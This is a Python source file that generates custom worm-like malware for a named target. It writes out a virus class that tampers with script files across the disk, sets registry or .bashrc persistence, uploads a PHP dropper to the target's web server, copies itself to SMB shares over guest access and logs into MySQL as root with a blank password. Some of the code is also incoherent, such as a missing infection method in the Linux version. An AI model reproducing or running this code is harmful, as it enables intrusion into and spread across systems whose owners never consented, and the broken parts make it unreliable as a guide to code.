import random
import string
import base64

def generate_bespoke_virus(target, vulnerability_data, open_ports, platform="windows"):
    """
    Generate custom viruses tailored to specific vulnerabilities and target environment.
    """
    vulnerabilities = vulnerability_data.get('vulnerabilities', [])
    virus_components = []
    
    # Base virus structure
    virus_core = generate_virus_core(target, platform)
    
    # Add vulnerability-specific modules
    for vuln in vulnerabilities:
        if vuln.get('port') == 80 and 'HTTP' in vuln.get('name', ''):
            virus_components.append(generate_web_infection_module(target))
        elif vuln.get('port') == 445:
            virus_components.append(generate_smb_spread_module(target))
        elif vuln.get('port') == 3306:
            virus_components.append(generate_database_infection_module(target))
    
    # Combine all components
    complete_virus = combine_virus_components(virus_core, virus_components, platform)
    
    return {
        "bespoke_virus": complete_virus,
        "target_vulnerabilities": [v.get('name') for v in vulnerabilities],
        "infection_vectors": len(virus_components),
        "platform": platform
    }

def generate_virus_core(target, platform):
    """Generate core virus functionality"""
    if platform == "windows":
        return f"""
import os, sys, shutil, subprocess, winreg
import random, string, time

class BespokeVirus:
    def __init__(self):
        self.target = "{target}"
        self.marker = "INFECTED_" + ''.join(random.choices(string.ascii_letters, k=8))
        self.payload_executed = False
    
    def infect_files(self):
        extensions = ['.py', '.bat', '.ps1', '.vbs']
        for root, dirs, files in os.walk('C:\\\\'):
            for file in files:
                if any(file.endswith(ext) for ext in extensions):
                    self.infect_file(os.path.join(root, file))
    
    def infect_file(self, filepath):
        try:
            with open(filepath, 'r+') as f:
                content = f.read()
                if self.marker not in content:
                    f.seek(0, 0)
                    f.write(f'#{self.marker}\\n' + content)
        except:
            pass
    
    def establish_persistence(self):
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                               "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", 
                               0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "SystemUpdate", 0, winreg.REG_SZ, sys.executable)
            winreg.CloseKey(key)
        except:
            pass
"""
    else:  # Linux
        return f"""
import os, sys, shutil, subprocess
import random, string, time

class BespokeVirus:
    def __init__(self):
        self.target = "{target}"
        self.marker = "INFECTED_" + ''.join(random.choices(string.ascii_letters, k=8))
    
    def infect_files(self):
        extensions = ['.py', '.sh', '.pl']
        for root, dirs, files in os.walk('/home'):
            for file in files:
                if any(file.endswith(ext) for ext in extensions):
                    self.infect_file(os.path.join(root, file))
    
    def establish_persistence(self):
        try:
            with open(os.path.expanduser('~/.bashrc'), 'a') as f:
                f.write(f'\\nnohup python3 {sys.argv[0]} &\\n')
        except:
            pass
"""

def generate_web_infection_module(target):
    """Generate web-based infection module"""
    return f"""
    def web_infection(self):
        import requests
        try:
            # Upload virus to web server
            virus_code = open(__file__, 'r').read()
            requests.post('http://{target}/upload.php', 
                         files={{'file': ('virus.php', 
                                '<?php file_put_contents("virus.py", base64_decode("' + 
                                base64.b64encode(virus_code.encode()).decode() + '")); ?>')}})
            
            # Execute via web request
            requests.get('http://{target}/virus.php')
        except:
            pass
"""

def generate_smb_spread_module(target):
    """Generate SMB spreading module"""
    return f"""
    def smb_spread(self):
        try:
            from smb.SMBConnection import SMBConnection
            conn = SMBConnection('guest', '', 'virus', 'target')
            if conn.connect('{target}', 445):
                # Copy virus to shared folders
                virus_data = open(__file__, 'rb').read()
                shares = conn.listShares()
                for share in shares:
                    try:
                        conn.storeFile(share.name, 'system_update.py', virus_data)
                    except:
                        continue
                conn.close()
        except:
            pass
"""

def generate_database_infection_module(target):
    """Generate database infection module"""
    return f"""
    def database_infection(self):
        try:
            import mysql.connector
            conn = mysql.connector.connect(host='{target}', user='root', password='')
            cursor = conn.cursor()
            
            # Create stored procedure with virus code
            virus_b64 = base64.b64encode(open(__file__, 'rb').read()).decode()
            cursor.execute(f"CREATE PROCEDURE virus_proc() READS SQL DATA DETERMINISTIC BEGIN SELECT '{virus_b64}'; END")
            conn.close()
        except:
            pass
"""

def combine_virus_components(core, components, platform):
    """Combine all virus components into executable code"""
    combined = core
    
    for component in components:
        combined += component
    
    # Add execution logic
    combined += """
    def execute(self):
        self.infect_files()
        self.establish_persistence()
"""
    
    for i, component in enumerate(components):
        if "web_infection" in component:
            combined += "        self.web_infection()\n"
        elif "smb_spread" in component:
            combined += "        self.smb_spread()\n"
        elif "database_infection" in component:
            combined += "        self.database_infection()\n"
    
    combined += """
if __name__ == '__main__':
    virus = BespokeVirus()
    virus.execute()
"""
    
    return combined
